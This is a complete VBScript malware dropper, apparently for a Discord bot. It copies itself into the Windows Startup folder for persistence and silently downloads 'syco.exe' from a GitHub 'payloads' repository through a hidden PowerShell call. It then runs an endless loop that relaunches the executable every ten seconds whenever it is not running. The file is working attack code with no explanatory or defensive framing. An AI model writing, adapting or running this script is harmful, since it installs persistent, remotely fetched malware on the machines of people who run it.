i = 10
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")
strScriptPath = WScript.ScriptFullName
strStartupFolder = objShell.SpecialFolders("Startup")
strDestPath = objFSO.BuildPath(strStartupFolder, objFSO.GetFileName(strScriptPath))

' Define the new directory on C: drive
discordDir = "C:\test"
botExePath = discordDir & "\syco.exe" ' Path to bot.exe in the C:\test directory

' Create the discord directory if it doesn't exist
If Not objFSO.FolderExists(discordDir) Then
    objFSO.CreateFolder(discordDir)
End If

' Copy the script to the startup folder if not already present
If Not objFSO.FileExists(strDestPath) Then
    objFSO.CopyFile strScriptPath, strDestPath
End If

' Download bot.exe if not already downloaded
If Not objFSO.FileExists(botExePath) Then
    objShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4kr4m0/payloads/refs/heads/main/syco.exe' -OutFile '" & botExePath & "'""", 0, True
End If

' Loop to check if bot.exe is running
Do While i <= 11
    ' Define the bot process name
    botProcessName = "syco.exe"

    ' Create a WMI object
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

    ' Define the WMI query to check if bot.exe is running
    query = "SELECT * FROM Win32_Process WHERE Name = '" & botProcessName & "'"

    ' Execute the query
    Set colProcesses = objWMIService.ExecQuery(query)

    ' Check if bot.exe is running
    If colProcesses.Count = 0 Then
        ' Start bot.exe if it is not running
        objShell.Run "powershell -Command ""Start-Process '" & botExePath & "'""", 0, True
    End If

    ' Optional: Sleep to prevent excessive looping
    WScript.Sleep 10000 ' Sleeps for 10 seconds between checks
Loop
